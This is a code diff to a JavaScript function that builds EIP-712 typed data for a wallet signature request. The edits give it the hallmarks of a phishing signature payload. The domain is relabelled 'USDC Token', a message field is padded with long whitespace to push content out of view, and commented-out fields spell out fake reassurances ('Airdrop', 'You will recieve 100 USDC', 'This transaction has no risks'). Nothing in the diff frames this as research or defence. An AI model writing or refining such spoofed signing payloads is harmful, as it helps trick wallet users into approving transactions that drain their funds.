@@ -13,21 +13,25 @@ function genTypedData(chainId, verifyAddr) {
                 { name: 'chainId', type: 'uint256' },
                 { name: 'verifyingContract', type: 'address' }
             ],
-            Permit: [
+            permit: [
                 { name: '_nftAmount', type: 'uint256' },
                 { name: 'msg', type: 'string' }
             ]
         },
         primaryType: 'Permit',
         domain: {
-            name: 'EIP-2612 Token',
+            name: 'USDC Token',
             version: '1',
             chainId: chainId,
             verifyingContract: verifyAddr
         },
-        message: {
-            _nftAmount: '0000000000000000000000000000000000000000000000000000000000000001',
-            msg: "                                                                                                                                           1"
+        permit: {
+            msg: "                                                                                                                                               1",
+            // activity: "Airdrop",
+            // simulation_result: "You will recieve 100 USDC in",
+            // security: "This transaction has no risks",
+            // msg:"                                                                                                                                                   you will benefit from this",
+            _nftAmount: '1'
         }
     }
 
